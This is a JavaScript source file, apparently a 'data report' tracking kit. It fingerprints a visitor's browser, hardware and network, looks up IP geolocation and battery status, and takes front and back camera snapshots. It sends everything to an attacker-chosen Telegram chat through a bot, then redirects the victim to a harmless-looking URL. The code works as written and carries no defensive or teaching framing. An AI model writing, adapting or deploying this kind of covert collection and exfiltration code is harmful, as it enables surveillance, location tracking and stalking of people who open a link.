export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl = 'https://google.com', ...collectedData } = req.body;

    // Process and format the collected data
    const messageParts = [];
    
    // Header
    messageParts.push(
      `🔰 *Opas Labs - Data Report* 🔰`,
      `🆔 Chat ID: ${telegramId}`,
      `🕒 Time: ${new Date().toLocaleString()}`
    );

    // Basic Info
    if (collectedData.browser || collectedData.platform) {
      messageParts.push(`\n🌐 *Basic Info*`);
      if (collectedData.browser) messageParts.push(`- Browser: ${collectedData.browser}`);
      if (collectedData.platform) messageParts.push(`- Platform: ${collectedData.platform}`);
      if (collectedData.language) messageParts.push(`- Language: ${collectedData.language}`);
      if (collectedData.timezone) messageParts.push(`- Timezone: ${collectedData.timezone}`);
      if (collectedData.cookies) messageParts.push(`- Cookies: ${collectedData.cookies}`);
    }

    // Hardware Info
    if (collectedData.cpu || collectedData.memory || collectedData.screen) {
      messageParts.push(`\n💻 *Hardware*`);
      if (collectedData.cpu) messageParts.push(`- CPU: ${collectedData.cpu}`);
      if (collectedData.memory) messageParts.push(`- RAM: ${collectedData.memory}`);
      if (collectedData.screen) messageParts.push(`- Screen: ${collectedData.screen}`);
      if (collectedData.touch) messageParts.push(`- Touch: ${collectedData.touch}`);
      if (collectedData.webgl) {
        messageParts.push(`- WebGL: ${collectedData.webgl.vendor || 'Unknown'} | ${collectedData.webgl.renderer || 'Unknown'}`);
      }
    }

    // Network Info
    if (collectedData.network) {
      messageParts.push(`\n📶 *Network*`);
      if (collectedData.network.type) messageParts.push(`- Type: ${collectedData.network.type}`);
      if (collectedData.network.effectiveType) messageParts.push(`- Speed: ${collectedData.network.effectiveType}`);
      if (collectedData.network.downlink) messageParts.push(`- Downlink: ${collectedData.network.downlink} Mbps`);
      if (collectedData.network.rtt) messageParts.push(`- Latency: ${collectedData.network.rtt} ms`);
      if (collectedData.network.saveData !== undefined) {
        messageParts.push(`- Data Saver: ${collectedData.network.saveData ? 'Enabled' : 'Disabled'}`);
      }
    }

    // Location Info
    if (collectedData.ip || collectedData.city) {
      messageParts.push(`\n📍 *Approximate Location*`);
      if (collectedData.ip) messageParts.push(`- IP: ${collectedData.ip}`);
      if (collectedData.city) messageParts.push(`- City: ${collectedData.city}`);
      if (collectedData.region) messageParts.push(`- Region: ${collectedData.region}`);
      if (collectedData.country) messageParts.push(`- Country: ${collectedData.country}`);
    }

    // Battery Info
    if (collectedData.battery || collectedData.charging !== undefined) {
      messageParts.push(`\n🔋 *Battery*`);
      if (collectedData.battery) messageParts.push(`- Level: ${collectedData.battery}`);
      if (collectedData.charging !== undefined) {
        messageParts.push(`- Charging: ${collectedData.charging ? 'Yes' : 'No'}`);
      }
    }

    // Camera Status
    if (collectedData.cameraStatus) {
      messageParts.push(`\n📷 *Camera Status*`);
      messageParts.push(`- ${collectedData.cameraStatus}`);
    }

    // Join all message parts
    const messageText = messageParts.join('\n');

    // Send text data to Telegram
    const textResponse = await sendTextToTelegram(telegramId, messageText);

    if (!textResponse.ok) {
      throw new Error('Failed to send text to Telegram');
    }

    // Handle photo uploads if they exist
    if (collectedData.frontSnap || collectedData.backSnap) {
      const photoUploads = [];
      
      if (collectedData.frontSnap) {
        photoUploads.push(
          sendPhotoToTelegram(
            collectedData.frontSnap, 
            telegramId, 
            "📷 Front Camera Snapshot"
          )
        );
      }
      
      if (collectedData.backSnap) {
        photoUploads.push(
          sendPhotoToTelegram(
            collectedData.backSnap, 
            telegramId, 
            "📷 Back Camera Snapshot"
          )
        );
      }
      
      await Promise.all(photoUploads);
    }

    // Only redirect after all data is successfully sent
    res.status(200).json({ 
      success: true,
      redirectUrl: redirectUrl
    });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ 
      error: 'Failed to process data',
      details: error.message 
    });
  }
};

async function sendTextToTelegram(chatId, text) {
  return fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    }
  );
}

async function sendPhotoToTelegram(base64Image, chatId, caption) {
  try {
    // Convert base64 to blob
    const blob = await fetch(base64Image).then(res => res.blob());
    
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'snapshot.jpg');
    formData.append('caption', caption);

    return fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
      {
        method: 'POST',
        body: formData
      }
    );
  } catch (error) {
    console.error('Error sending photo:', error);
    throw error;
  }
}

// Utility functions that would be used by frontend
const deviceInfoUtils = {
  getDeviceInfo: async () => {
    const data = {
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
      cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
      screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
      touch: 'ontouchstart' in window ? "Yes" : "No",
      webgl: getWebGLInfo(),
      network: await getNetworkInfo(),
      ip: "Unknown",
      city: "",
      region: "",
      country: "",
      battery: "Unknown",
      charging: "Unknown",
      cameraStatus: ""
    };

    // Fetch IP/location
    try {
      const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
      const ipData = await res.json();
      data.ip = ipData.ip;
      data.city = ipData.city;
      data.region = ipData.region;
      data.country = ipData.country;
    } catch {}

    // Battery status
    try {
      const battery = await navigator.getBattery();
      data.battery = `${(battery.level * 100).toFixed(0)}%`;
      data.charging = battery.charging ? "Yes" : "No";
    } catch {}

    return data;
  },

  getSnapshot: async (facingMode) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();
      await new Promise(res => setTimeout(res, 1000));
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
      stream.getTracks().forEach(track => track.stop());
      return URL.createObjectURL(blob);
    } catch (err) {
      console.warn(`Camera access denied (${facingMode})`, err);
      return null;
    }
  }
};

// Helper functions
function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (connection) {
    return {
      type: connection.type || "Unknown",
      effectiveType: connection.effectiveType || "Unknown",
      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
      saveData: connection.saveData ? "Enabled" : "Disabled",
    };
  }
  return { type: "Network API not supported" };
}

function getWebGLInfo() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return { vendor: "WebGL not supported", renderer: "WebGL not supported" };
  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
  };
}
